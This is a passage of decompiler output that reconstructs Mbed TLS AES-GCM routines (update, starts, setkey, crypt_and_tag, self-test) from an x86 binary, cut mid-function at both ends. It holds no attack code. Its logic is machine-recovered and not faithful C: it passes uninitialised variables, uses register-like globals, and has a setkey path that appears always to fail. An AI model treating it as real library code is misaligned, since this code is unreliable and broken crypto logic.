        v18 = *(char *)((int32_t)&v11 + v13);
        v19 = (char *)(v13 + 368 + g3);
        *v19 = *v19 ^ v18;
        v20++;
        // continue -> 0x806c528
    }
    // 0x806c53b
    v16 = g3;
    g6 = v16 + 368;
    g1 = v16;
    gcm_mult((int32_t)a2, v9, a3, 0, v6, v5, v8, v7);
    v17 = 0;
    v15 = (char *)(g7 + v17);
    *v15 = *v15 ^ *(char *)(v17 + 368 + g3);
    v14 = 1;
    // branch -> 0x806c550
    while (v14 != g5) {
        // 0x806c550
        v17 = v14;
        v15 = (char *)(g7 + v17);
        *v15 = *v15 ^ *(char *)(v17 + 368 + g3);
        v14++;
        // continue -> 0x806c550
    }
    // 0x806c562
    // branch -> 0x806c471
    // 0x806c471
    g3 = v1;
    return 0;
}

// Address range: 0x806c570 - 0x806c58f
int32_t mbedtls_gcm_init(char * a1) {
    // 0x806c570
    memset(a1, 0, 97);
    return 0;
}

// Address range: 0x806c590 - 0x806c6ff
int32_t mbedtls_gcm_update(int32_t a1, int32_t a2, char * a3, uint32_t a4) {
    int32_t v1 = g5; // 0x806c593
    int32_t v2 = g7; // 0x806c594
    int32_t v3 = g3; // 0x806c595
    int32_t v4 = (int32_t)a3;
    g4 = v4;
    g5 = a4;
    g3 = a1;
    int32_t v5;
    uint32_t v6; // 0x806c5d7
    int32_t * v7; // 0x806c5c0_0
    char * v8; // 0x806c638_0
    int32_t v9; // 0x806c653_0
    int32_t v10; // 0x806c65d_0
    int32_t result; // 0x806c673
    int32_t v11; // eax
    int32_t v12; // edx
    int32_t v13; // bp-124
    int32_t v14;
    int32_t v15;
    int32_t v16;
    int32_t result2;
    uint32_t v17; // 0x806c5da
    int32_t v18; // 0x806c60e
    int32_t v19; // 0x806c66c
    int32_t v20; // 0x806c60e
    int32_t v21; // 0x806c614
    uint32_t v22; // 0x806c5c0
    uint32_t v23; // 0x806c5c6
    int32_t v24; // 0x806c6e633
    if (v4 >= a4) {
        // 0x806c5c0
        v7 = (int32_t *)(a1 + 320);
        v22 = *v7;
        v23 = *(int32_t *)(a1 + 324);
        v6 = v22 + a2;
        v17 = (int32_t)(v6 < a2) + v23;
        v12 = v17;
        if (v23 > v17) {
            // 0x806c5af
            // branch -> 0x806c5b4
            // 0x806c5b4
            g3 = v3;
            g7 = v2;
            g5 = v1;
            g2 = v16;
            return -20;
        }
        // 0x806c5e2
        if (v23 < v17) {
            // 0x806c5e9
            if (v17 == 0) {
                // 0x806c5f2
                if (v6 <= 0x3ffffe0) {
                    // 0x806c5f9
                    *v7 = v6;
                    g7 = 0;
                    *(int32_t *)(g3 + 324) = v12;
                    if (a2 == 0) {
                        // 0x806c5f9
                        result2 = g7;
                        // branch -> 0x806c5b4
                    } else {
                        // 0x806c60e
                        v18 = g3;
                        v20 = v18 + 352;
                        v21 = v18 + 368;
                        v14 = 0;
                        v9 = &v14;
                        v10 = &v15;
                        v24 = a2;
                        v5 = g4;
                        // branch -> 0x806c630
                        while (true) {
                            // 0x806c630
                            v8 = (char *)(v18 + 367);
                            *v8 = (char)((int32_t)*v8 + 1);
                            v19 = g3;
                            v13 = v19;
                            result = mbedtls_cipher_update((char *)v19, (char *)v20, 16, v10, &v14, 0, 0, 0);
                            v11 = result;
                            if (result == 0) {
                                goto lab_0x806c67f_3;
                            }
                            // 0x806c6f5
                            // branch -> 0x806c5b4
                            // 0x806c5b4
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v16;
                            return result;
                        }
                    }
                    // 0x806c5b4
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v16;
                    return result2;
                }
            }
        } else {
            // 0x806c5e4
            if (v22 <= v6) {
                // 0x806c5e9
                if (v17 == 0) {
                    // 0x806c5f2
                    if (v6 <= 0x3ffffe0) {
                        // 0x806c5f9
                        *v7 = v6;
                        g7 = 0;
                        *(int32_t *)(g3 + 324) = v12;
                        if (a2 == 0) {
                            // 0x806c5f9
                            result2 = g7;
                            // branch -> 0x806c5b4
                        } else {
                            // 0x806c60e
                            v18 = g3;
                            v20 = v18 + 352;
                            v21 = v18 + 368;
                            v14 = 0;
                            v9 = &v14;
                            v10 = &v15;
                            v24 = a2;
                            v5 = g4;
                            // branch -> 0x806c630
                            while (true) {
                                // 0x806c630
                                v8 = (char *)(v18 + 367);
                                *v8 = (char)((int32_t)*v8 + 1);
                                v19 = g3;
                                v13 = v19;
                                result = mbedtls_cipher_update((char *)v19, (char *)v20, 16, v10, &v14, 0, 0, 0);
                                v11 = result;
                                if (result == 0) {
                                    goto lab_0x806c67f_3;
                                }
                                // 0x806c6f5
                                // branch -> 0x806c5b4
                                // 0x806c5b4
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                g2 = v16;
                                return result;
                            }
                        }
                        // 0x806c5b4
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        g2 = v16;
                        return result2;
                    }
                }
            }
        }
        // 0x806c5af
        // branch -> 0x806c5b4
        // 0x806c5b4
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v16;
        return -20;
    }
    // 0x806c5a6
    if (a4 - v4 < a2) {
        // 0x806c5af
        // branch -> 0x806c5b4
        // 0x806c5b4
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v16;
        return -20;
    }
    // 0x806c5c0
    v7 = (int32_t *)(a1 + 320);
    v22 = *v7;
    v23 = *(int32_t *)(a1 + 324);
    v6 = v22 + a2;
    v17 = (int32_t)(v6 < a2) + v23;
    v12 = v17;
    if (v23 > v17) {
        // 0x806c5af
        // branch -> 0x806c5b4
        // 0x806c5b4
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v16;
        return -20;
    }
    // 0x806c5e2
    if (v23 < v17) {
        // 0x806c5e9
        if (v17 == 0) {
            // 0x806c5f2
            if (v6 <= 0x3ffffe0) {
                // 0x806c5f9
                *v7 = v6;
                g7 = 0;
                *(int32_t *)(g3 + 324) = v12;
                if (a2 == 0) {
                    // 0x806c5f9
                    result2 = g7;
                    // branch -> 0x806c5b4
                } else {
                    // 0x806c60e
                    v18 = g3;
                    v20 = v18 + 352;
                    v21 = v18 + 368;
                    v14 = 0;
                    v9 = &v14;
                    v10 = &v15;
                    v24 = a2;
                    v5 = g4;
                    // branch -> 0x806c630
                    while (true) {
                        // 0x806c630
                        v8 = (char *)(v18 + 367);
                        *v8 = (char)((int32_t)*v8 + 1);
                        v19 = g3;
                        v13 = v19;
                        result = mbedtls_cipher_update((char *)v19, (char *)v20, 16, v10, &v14, 0, 0, 0);
                        v11 = result;
                        if (result != 0) {
                            // 0x806c6f5
                            // branch -> 0x806c5b4
                            // 0x806c5b4
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v16;
                            return result;
                        }
                      lab_0x806c67f_3:;
                        int32_t v25 = v24 > 16 ? 16 : v24;
                        int32_t v26; // 0x806c6e6
                        if (v25 == 0) {
                            // 0x806c6da
                            g1 = g3;
                            g6 = v21;
                            gcm_mult(v13, v20, 16, v10, v9, 0, 0, 0);
                            v26 = g7;
                            if (v24 != v26) {
                                goto lab_0x806c6eb_2;
                            }
                            // 0x806c6f5
                            // branch -> 0x806c5b4
                            // 0x806c5b4
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v16;
                            return 0;
                        }
                        int32_t v27 = v5; // ecx
                        int32_t v28 = 0; // 0x806c6af
                        int32_t v29 = v5; // 0x806c6ac
                        // branch -> 0x806c6a2
                        while (true) {
                            int32_t v30 = g3; // 0x806c6a2
                            int32_t v31 = v28; // 0x806c6bd
                            int32_t v32 = v29; // 0x806c6b6
                            if (*(int32_t *)(v30 + 384) == 0) {
                                unsigned char v33 = *(char *)v29; // 0x806c6ac
                                char * v34 = (char *)(v28 + 368 + v30); // 0x806c6af_0
                                *v34 = (char)((int32_t)*v34 ^ (int32_t)v33);
                                v31 = v11;
                                v32 = v27;
                                // branch -> 0x806c6b6
                            }
                            char v35 = *(char *)(v31 - 44 + g2); // 0x806c6b9
                            unsigned char v36 = v35 ^ *(char *)v32; // 0x806c6b943
                            v12 = v36;
                            *(char *)(g5 + v31) = v36;
                            int32_t v37 = g3; // 0x806c6c0
                            int32_t v38 = v11; // 0x806c6c9
                            if (*(int32_t *)(v37 + 384) == 1) {
                                char * v39 = (char *)(v37 + 368 + v38); // 0x806c6c9_0
                                *v39 = (char)(v12 ^ (int32_t)*v39);
                                int32_t v40 = v11 + 1; // 0x806c6d0
                                v11 = v40;
                                int32_t v41 = v27 + 1; // 0x806c6d3
                                v27 = v41;
                                if (v40 == v25) {
                                    // break -> 0x806c6da
                                    break;
                                }
                                v28 = v40;
                                v29 = v41;
                                // continue -> 0x806c6a2
                                continue;
                            } else {
                                int32_t v42 = v38 + 1; // 0x806c698
                                v11 = v42;
                                int32_t v43 = v27 + 1; // 0x806c69b
                                v27 = v43;
                                if (v42 == v25) {
                                    // break -> 0x806c6da
                                    break;
                                }
                                v28 = v42;
                                v29 = v43;
                                // continue -> 0x806c6a2
                                continue;
                            }
                            int32_t v44 = g3; // 0x806c6dd
                            g1 = v44;
                            g6 = v21;
                            int32_t v45 = v13; // 0x806c6e1
                            gcm_mult(v45, v20, 16, v10, v9, 0, 0, 0);
                            v26 = g7;
                            int32_t v46 = 0;
                            if (v24 != v26) {
                              lab_0x806c6eb_2:
                                // 0x806c6eb
                                g5 += v26;
                                v24 -= v26;
                                v5 += v26;
                                // branch -> 0x806c630
                                break;
                            }
                            int32_t result3 = v46; // 0x806c5b7
                            // branch -> 0x806c5b4
                            // 0x806c5b4
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            int32_t v47 = v16; // 0x806c5bc
                            g2 = v47;
                            return result3;
                        }
                        // 0x806c6da
                        g1 = g3;
                        g6 = v21;
                        gcm_mult(v13, v20, 16, v10, v9, 0, 0, 0);
                        v26 = g7;
                        if (v24 != v26) {
                            goto lab_0x806c6eb_2;
                        }
                        // 0x806c6f5
                        // branch -> 0x806c5b4
                        // 0x806c5b4
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        g2 = v16;
                        return 0;
                    }
                }
                // 0x806c5b4
                g3 = v3;
                g7 = v2;
                g5 = v1;
                g2 = v16;
                return result2;
            }
        }
    } else {
        // 0x806c5e4
        if (v22 <= v6) {
            // 0x806c5e9
            if (v17 == 0) {
                // 0x806c5f2
                if (v6 <= 0x3ffffe0) {
                    // 0x806c5f9
                    *v7 = v6;
                    g7 = 0;
                    *(int32_t *)(g3 + 324) = v12;
                    if (a2 == 0) {
                        // 0x806c5f9
                        result2 = g7;
                        // branch -> 0x806c5b4
                    } else {
                        // 0x806c60e
                        v18 = g3;
                        v20 = v18 + 352;
                        v21 = v18 + 368;
                        v14 = 0;
                        v9 = &v14;
                        v10 = &v15;
                        v24 = a2;
                        v5 = g4;
                        // branch -> 0x806c630
                        while (true) {
                            // 0x806c630
                            v8 = (char *)(v18 + 367);
                            *v8 = (char)((int32_t)*v8 + 1);
                            v19 = g3;
                            v13 = v19;
                            result = mbedtls_cipher_update((char *)v19, (char *)v20, 16, v10, &v14, 0, 0, 0);
                            v11 = result;
                            if (result == 0) {
                                goto lab_0x806c67f_3;
                            }
                            // 0x806c6f5
                            // branch -> 0x806c5b4
                            // 0x806c5b4
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v16;
                            return result;
                        }
                    }
                    // 0x806c5b4
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v16;
                    return result2;
                }
            }
        }
    }
    // 0x806c5af
    // branch -> 0x806c5b4
    // 0x806c5b4
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v16;
    return -20;
}

// Address range: 0x806c700 - 0x806c90f
int32_t mbedtls_gcm_starts(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x806c703
    int32_t v2 = g7; // 0x806c704
    int32_t v3 = g3; // 0x806c705
    g3 = a1;
    int32_t v4 = 0; // bp-32
    g5 = (int32_t)a3;
    int32_t v5 = a1 + 368; // eax
    int32_t v6 = a1 + 352; // 0x806c71c
    g7 = v6;
    *(int32_t *)v6 = 0;
    *(int32_t *)(g7 + 4) = 0;
    *(int32_t *)(g7 + 8) = 0;
    *(int32_t *)(g7 + 12) = 0;
    int32_t v7 = v5; // 0x806c741
    *(int32_t *)(g3 + 368) = 0;
    *(int32_t *)(v5 + 4) = 0;
    *(int32_t *)(v5 + 8) = 0;
    *(int32_t *)(v5 + 12) = 0;
    *(int32_t *)(g3 + 320) = 0;
    *(int32_t *)(g3 + 324) = 0;
    *(int32_t *)(g3 + 384) = a2;
    *(int32_t *)(g3 + 328) = 0;
    *(int32_t *)(g3 + 332) = 0;
    int32_t result; // 0x806c86e
    int32_t v8;
    int32_t v9; // 0x806c887
    int32_t v10; // 0x806c855
    int32_t v11; // 0x806c855
    int32_t v12; // 0x806c867
    int32_t v13; // 0x806c8ce33
    int32_t v14;
    if (a4 == 12) {
        // 0x806c8e8
        *(int32_t *)(g3 + 352) = *(int32_t *)g5;
        *(int32_t *)(g7 + 4) = *(int32_t *)(g5 + 4);
        *(int32_t *)(g7 + 8) = *(int32_t *)(g5 + 8);
        *(char *)(g3 + 367) = 1;
        // branch -> 0x806c84e
    } else {
        int32_t v15 = 0;
        int32_t v16; // 0x806c83b
        int32_t v17; // 0x806c82c_0
        char * v18; // 0x806c834_0
        int32_t v19;
        int32_t v20;
        int32_t v21;
        int32_t v22;
        int32_t v23;
        int32_t v24; // 0x806c834
        if (a4 != 0) {
            int32_t v25 = g7; // 0x806c7e0
            // branch -> 0x806c7e8
            while (true) {
                int32_t v26 = a4 > 16 ? 16 : a4;
                int32_t v27 = v26; // esi
                int32_t v28; // 0x806c81e
                if (v26 != 0) {
                    int32_t v29 = 0; // 0x806c804
                    char * v30 = (char *)(v29 + 352 + g3); // 0x806c804_0
                    *v30 = *v30 ^ *(char *)(g5 + v29);
                    int32_t v31 = 1; // 0x806c80b
                    // branch -> 0x806c800
                    while (v31 != v27) {
                        // 0x806c800
                        v29 = v31;
                        v30 = (char *)(v29 + 352 + g3);
                        *v30 = *v30 ^ *(char *)(g5 + v29);
                        v31++;
                        // continue -> 0x806c800
                    }
                    // 0x806c812
                    g1 = g3;
                    g6 = v25;
                    gcm_mult(v21, v20, v19, v23, v22, 0, 0, 0);
                    v28 = g7;
                    if (a4 == v28) {
                        // 0x806c827
                        g7 = v25;
                        // branch -> 0x806c82a
                        // 0x806c82a
                        v5 = 0;
                        v17 = &v15;
                        v24 = 0;
                        // branch -> 0x806c830
                        while (true) {
                            // 0x806c830
                            v18 = (char *)(v24 + 352 + g3);
                            *v18 = *v18 ^ *(char *)(v17 + v24);
                            v16 = v5 + 1;
                            v5 = v16;
                            if (v16 == 16) {
                                // 0x806c843
                                g6 = g7;
                                g1 = g3;
                                gcm_mult(v21, v20, v19, v23, v22, 0, 0, 0);
                                // branch -> 0x806c84e
                                // 0x806c84e
                                v10 = g3;
                                v11 = v10 + 336;
                                v12 = g7;
                                result = mbedtls_cipher_update((char *)v10, (char *)v12, 16, v11, &v4, 0, 0, 0);
                                if (result == 0) {
                                    // 0x806c87a
                                    *(int32_t *)(g3 + 332) = 0;
                                    v9 = a6;
                                    *(int32_t *)(g3 + 328) = v9;
                                    if (v9 != 0) {
                                        v13 = a6;
                                        v8 = a5;
                                        while (true) {
                                            // 0x806c898
                                            v14 = v13 > 16 ? 16 : v13;
                                            if (v14 != 0) {
                                              lab_0x806c8a9:
                                                // 0x806c8a9
                                                v5 = 0;
                                                int32_t v32 = 0; // 0x806c8b4
                                                // branch -> 0x806c8b0
                                                while (true) {
                                                    char * v33 = (char *)(v32 + 368 + g3); // 0x806c8b4_0
                                                    *v33 = *v33 ^ *(char *)(v8 + v32);
                                                    int32_t v34 = v5 + 1; // 0x806c8bb
                                                    v5 = v34;
                                                    if (v34 != v14) {
                                                        // 0x806c8b0
                                                        v32 = v34;
                                                        // branch -> 0x806c8b0
                                                        continue;
                                                    }
                                                }
                                            }
                                          lab_0x806c8c2:
                                            // 0x806c8c2
                                            g1 = g3;
                                            g6 = v7;
                                            gcm_mult(v10, v12, 16, v11, (int32_t)&v4, 0, 0, 0);
                                            int32_t v35 = g5; // 0x806c8ce
                                            if (v13 != v35) {
                                                // 0x806c8d3
                                                v13 -= v35;
                                                v8 = g7 + v35;
                                                // branch -> 0x806c898
                                                continue;
                                            }
                                        }
                                    }
                                }
                                // 0x806c8d8
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return result;
                            }
                          lab_0x806c830:
                            // 0x806c830
                            v24 = v16;
                            // branch -> 0x806c830
                        }
                    } else {
                      lab_0x806c823:
                        // 0x806c823
                        g5 += v28;
                        a4 -= v28;
                        // branch -> 0x806c7e8
                        continue;
                    }
                }
                // 0x806c812
                g1 = g3;
                g6 = v25;
                gcm_mult(v21, v20, v19, v23, v22, 0, 0, 0);
                v28 = g7;
                if (a4 != v28) {
                    goto lab_0x806c823;
                }
                // 0x806c827
                g7 = v25;
                // branch -> 0x806c82a
            }
        }
        // 0x806c82a
        v5 = 0;
        v17 = &v15;
        v24 = 0;
        // branch -> 0x806c830
        while (true) {
            // 0x806c830
            v18 = (char *)(v24 + 352 + g3);
            *v18 = *v18 ^ *(char *)(v17 + v24);
            v16 = v5 + 1;
            v5 = v16;
            if (v16 != 16) {
                goto lab_0x806c830;
            }
            // 0x806c843
            g6 = g7;
            g1 = g3;
            gcm_mult(v21, v20, v19, v23, v22, 0, 0, 0);
            // branch -> 0x806c84e
        }
    }
    // 0x806c84e
    v10 = g3;
    v11 = v10 + 336;
    v12 = g7;
    result = mbedtls_cipher_update((char *)v10, (char *)v12, 16, v11, &v4, 0, 0, 0);
    if (result != 0) {
        // 0x806c8d8
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x806c87a
    *(int32_t *)(g3 + 332) = 0;
    v9 = a6;
    *(int32_t *)(g3 + 328) = v9;
    if (v9 != 0) {
        v13 = a6;
        v8 = a5;
        while (true) {
            // 0x806c898
            v14 = v13 > 16 ? 16 : v13;
            if (v14 == 0) {
                goto lab_0x806c8c2;
            }
            goto lab_0x806c8a9;
        }
    }
    // 0x806c8d8
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x806c910 - 0x806c9bf
int32_t mbedtls_gcm_crypt_and_tag(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11) {
    int32_t v1 = g3; // 0x806c919
    g3 = a1;
    int32_t v2 = g7; // 0x806c91f
    g7 = a3;
    int32_t v3 = g5; // 0x806c925
    g5 = a8;
    int32_t v4 = mbedtls_gcm_starts(a1, a2, (int32_t *)a4, a5, a6, a7); // 0x806c960
    int32_t result = v4; // 0x806c975_2
    if (v4 == 0) {
        int32_t v5 = mbedtls_gcm_update(g3, g7, (char *)g5, a9); // 0x806c98a
        if (v5 == 0) {
            int32_t v6 = g3; // 0x806c996
            g7 = v2;
            g3 = v1;
            g5 = v3;
            int32_t v7;
            int32_t v8;
            return mbedtls_gcm_finish(v8, (char *)v7, v6);
        }
        result = v5;
    }
    // 0x806c969
    g3 = v1;
    return result;
}

// Address range: 0x806ca80 - 0x806cd3f
int32_t mbedtls_gcm_setkey(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g7; // 0x806ca89
    g7 = a4;
    int32_t v3 = g3; // 0x806ca92
    g3 = a1;
    int32_t v4 = mbedtls_cipher_info_from_values(a2, a4, 1); // 0x806caaa
    g1 = v4;
    if (v4 != 0) {
        // 0x806cac8
        if (*(int32_t *)(v4 + 24) == 16) {
            // 0x806cace
            mbedtls_cipher_free((char *)g3, a4);
            int32_t v5 = mbedtls_cipher_setup((char *)g3, v4); // 0x806cae3
            g1 = v5;
            int32_t result = v5; // 0x806cac4_2
            if (v5 == 0) {
                // 0x806caec
                int32_t v6;
                mbedtls_cipher_setkey((int32_t *)g3, a3, g7, 1, v6, 0, 0, 0);
                g1 = -0x6100;
                result = -0x6100;
                // branch -> 0x806cab8
            }
            // 0x806cab8
            g3 = v3;
            g7 = v2;
            g2 = v1;
            return result;
        }
    }
    // 0x806cab3
    g1 = -20;
    // branch -> 0x806cab8
    // 0x806cab8
    g3 = v3;
    g7 = v2;
    g2 = v1;
    return -20;
}

// Address range: 0x806cd40 - 0x806d4af
int32_t mbedtls_gcm_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x806cd43
    int32_t v2 = g7; // 0x806cd44
    int32_t v3 = g3; // bp-16
    int32_t v4;
    int32_t v5 = &v4; // 0x806cd46_0
    mbedtls_gcm_init((char *)&v4);
    int32_t str3;
    int32_t v6 = &str3; // 0x806cd5a_0
    int32_t str;
    int32_t v7 = &str; // 0x806cd5d_0
    int32_t v8;
    int32_t v9 = &v8;
    int32_t v10 = 128; // 0x806d44249
    int32_t v11 = 0; // 0x806d2c448
    // branch -> 0x806cd80
    while (true) {
        int32_t v12 = 4 * v11 + (int32_t)&g154;
        int32_t v13 = v11 + (int32_t)&g155;
        // branch -> 0x806cdaf
        for (uint32_t i = 0; i < 6; i++) {
            char * str4 = (char *)v13;
            char * str2 = (char *)v12;
            if (a1 != 0) {
                // 0x806d380
                printf("  AES-GCM-%3d #%d (%s): ", v10, i, "enc");
                // branch -> 0x806cdba
            }
            int32_t v14 = 4 * i; // 0x806cdc8
            int32_t v15 = *(int32_t *)(v14 + (int32_t)&g144); // 0x806cdc8
            int32_t v16 = 32 * v15 + (int32_t)&g143; // 0x806cdd2
            mbedtls_gcm_setkey(v5, 2, v16, v10);
            int32_t v17 = *(int32_t *)(v14 + (int32_t)&g148); // 0x806ce22
            int32_t v18 = 64 * *(int32_t *)(v14 + (int32_t)&g147); // 0x806ce3d
            int32_t v19 = v18 + (int32_t)&g145; // 0x806ce40
            g5 = v19;
            char * str5 = (char *)v19;
            int32_t v20 = *(int32_t *)(v14 + (int32_t)&g150); // 0x806ce4c
            int32_t v21 = *(int32_t *)(v14 + (int32_t)&g153); // 0x806ce53
            g3 = v21;
            int32_t v22 = 64 * v20 + (int32_t)&g149; // 0x806ce61
            int32_t v23 = *(int32_t *)(v14 + (int32_t)L"\f\f\f\f\b<"); // 0x806ce6c
            int32_t v24 = *(int32_t *)(v14 + (int32_t)&g152); // 0x806ce7d
            int32_t v25 = 64 * v24 + (int32_t)&g151; // 0x806ce94
            int32_t v26 = mbedtls_gcm_crypt_and_tag(v5, 1, v21, v25, v23, v22, v17, v19, v7, 16, v6); // 0x806ced1
            g1 = v26;
            if (v26 == 0) {
                uint32_t strncmp_rc = strncmp((char *)&str, str2, g3);
                g237 = strncmp_rc % 2 == 0;
                if (strncmp_rc % 2 == 0) {
                    // 0x806cef6
                    g7 = v6;
                    g5 = v13;
                    uint32_t strncmp_rc2 = strncmp((char *)&str3, str4, 16);
                    g4 = strncmp_rc2;
                    g237 = strncmp_rc2 % 2 == 0;
                    if (strncmp_rc2 % 2 == 0) {
                        // 0x806cf0f
                        mbedtls_gcm_free((char *)&v4);
                        if (a1 != 0) {
                            // 0x806d3b0
                            puts("passed");
                            printf("  AES-GCM-%3d #%d (%s): ", v10, i, "dec");
                            // branch -> 0x806cf28
                        }
                        // 0x806cf28
                        mbedtls_gcm_setkey(v5, 2, v16, v10);
                        int32_t v27 = mbedtls_gcm_crypt_and_tag(v5, 0, g3, v25, v23, v22, v17, v12, v7, 16, v6); // 0x806cfaf
                        g1 = v27;
                        if (v27 == 0) {
                            uint32_t strncmp_rc3 = strncmp((char *)&str, str5, g3);
                            g237 = strncmp_rc3 % 2 == 0;
                            if (strncmp_rc3 % 2 == 0) {
                                // 0x806cfd4
                                g7 = v6;
                                g5 = v13;
                                uint32_t strncmp_rc4 = strncmp((char *)&str3, str4, 16);
                                g4 = strncmp_rc4;
                                g237 = strncmp_rc4 % 2 == 0;
                                if (strncmp_rc4 % 2 == 0) {
                                    // 0x806cfed
                                    mbedtls_gcm_free((char *)&v4);
                                    if (a1 != 0) {
                                        // 0x806d3f0
                                        puts("passed");
                                        printf("  AES-GCM-%3d #%d split (%s): ", v10, i, "enc");
                                        // branch -> 0x806d006
                                    }
                                    // 0x806d006
                                    mbedtls_gcm_setkey(v5, 2, v16, v10);
                                    int32_t * v28 = (int32_t *)v25;
                                    if (mbedtls_gcm_starts(v5, 1, v28, v23, v22, v17) == 0) {
                                        uint32_t v29 = g3; // 0x806d076
                                        if (v29 < 33) {
                                            // 0x806d2f8
                                            if (mbedtls_gcm_update(v5, v29, str5, v7) == 0) {
                                              lab_0x806d0e4:
                                                // 0x806d0e4
                                                if (mbedtls_gcm_finish(v5, (char *)&str3, 16) == 0) {
                                                    uint32_t strncmp_rc5 = strncmp((char *)&str, str2, g3);
                                                    g237 = strncmp_rc5 % 2 == 0;
                                                    if (strncmp_rc5 % 2 == 0) {
                                                        // 0x806d121
                                                        g7 = v6;
                                                        g5 = v13;
                                                        uint32_t strncmp_rc6 = strncmp((char *)&str3, str4, 16);
                                                        g4 = strncmp_rc6;
                                                        g237 = strncmp_rc6 % 2 == 0;
                                                        if (strncmp_rc6 % 2 == 0) {
                                                            // 0x806d13a
                                                            g1 = v5;
                                                            mbedtls_gcm_free((char *)&v4);
                                                            g5 = a1;
                                                            if (a1 != 0) {
                                                                // 0x806d430
                                                                puts("passed");
                                                                printf("  AES-GCM-%3d #%d split (%s): ", v10, i, "dec");
                                                                // branch -> 0x806d153
                                                            }
                                                            // 0x806d153
                                                            mbedtls_gcm_setkey(v5, 2, v16, v10);
                                                            if (mbedtls_gcm_starts(v5, 0, v28, v23, v22, v17) == 0) {
                                                                uint32_t v30 = g3; // 0x806d1c3
                                                                if (v30 < 33) {
                                                                    // 0x806d350
                                                                    if (mbedtls_gcm_update(v5, v30, str2, v7) == 0) {
                                                                      lab_0x806d22c:;
                                                                        int32_t v31 = mbedtls_gcm_finish(v5, (char *)&str3, 16); // 0x806d244
                                                                        g1 = v31;
                                                                        if (v31 == 0) {
                                                                            uint32_t strncmp_rc7 = strncmp((char *)&str, str5, g3);
                                                                            g237 = strncmp_rc7 % 2 == 0;
                                                                            if (strncmp_rc7 % 2 == 0) {
                                                                                // 0x806d269
                                                                                g7 = v6;
                                                                                g5 = v13;
                                                                                uint32_t strncmp_rc8 = strncmp((char *)&str3, str4, 16);
                                                                                g4 = strncmp_rc8;
                                                                                g237 = strncmp_rc8 % 2 == 0;
                                                                                if (strncmp_rc8 % 2 == 0) {
                                                                                    // 0x806d282
                                                                                    mbedtls_gcm_free((char *)&v4);
                                                                                    g3 = a1;
                                                                                    if (a1 != 0) {
                                                                                        // 0x806d470
                                                                                        puts("passed");
                                                                                        // branch -> 0x806d29b
                                                                                    }
                                                                                    // 0x806d29b
                                                                                    // PHI copies at the loop end
                                                                                    v12 += 64;
                                                                                    v13 += 16;
                                                                                    // loop 0x806cdaf end
                                                                                    continue;
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                } else {
                                                                    // 0x806d1cc
                                                                    if (mbedtls_gcm_update(v5, 32, str2, v7) == 0) {
                                                                        // 0x806d1fb
                                                                        if (mbedtls_gcm_update(v5, g3 - 32, (char *)(v12 + 32), v9) == 0) {
                                                                            goto lab_0x806d22c;
                                                                        }
                                                                        // 0x806d328
                                                                        g1 = 1;
                                                                        if (a1 == 0) {
                                                                            // 0x806d2e8
                                                                            g3 = v3;
                                                                            g7 = v2;
                                                                            g5 = v1;
                                                                            return 1;
                                                                        }
                                                                        // 0x806d334
                                                                        puts("failed");
                                                                        g1 = 1;
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return 1;
                                                                    }
                                                                }
                                                                // 0x806d328
                                                                g1 = 1;
                                                                if (a1 == 0) {
                                                                    // 0x806d2e8
                                                                    g3 = v3;
                                                                    g7 = v2;
                                                                    g5 = v1;
                                                                    return 1;
                                                                }
                                                                // 0x806d334
                                                                puts("failed");
                                                                g1 = 1;
                                                                g3 = v3;
                                                                g7 = v2;
                                                                g5 = v1;
                                                                return 1;
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        } else {
                                            // 0x806d07f
                                            if (mbedtls_gcm_update(v5, 32, str5, v7) == 0) {
                                                int32_t v32 = mbedtls_gcm_update(v5, g3 - 32, (char *)(v18 + (int32_t)&g146), v9); // 0x806d0d7
                                                if (v32 == 0) {
                                                    goto lab_0x806d0e4;
                                                }
                                                // 0x806d328
                                                g1 = 1;
                                                if (a1 == 0) {
                                                    // 0x806d2e8
                                                    g3 = v3;
                                                    g7 = v2;
                                                    g5 = v1;
                                                    return 1;
                                                }
                                                // 0x806d334
                                                puts("failed");
                                                g1 = 1;
                                                g3 = v3;
                                                g7 = v2;
                                                g5 = v1;
                                                return 1;
                                            }
                                        }
                                        // 0x806d328
                                        g1 = 1;
                                        if (a1 == 0) {
                                            // 0x806d2e8
                                            g3 = v3;
                                            g7 = v2;
                                            g5 = v1;
                                            return 1;
                                        }
                                        // 0x806d334
                                        puts("failed");
                                        g1 = 1;
                                        g3 = v3;
                                        g7 = v2;
                                        g5 = v1;
                                        return 1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            // 0x806d328
            g1 = 1;
            if (a1 == 0) {
                // 0x806d2e8
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 1;
            }
            // 0x806d334
            puts("failed");
            g1 = 1;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        int32_t v33 = v10 + 64; // 0x806d2bd
        if (v33 == 320) {
            // break -> 0x806d2db
            break;
        }
        v10 = v33;
        v11 += 96;
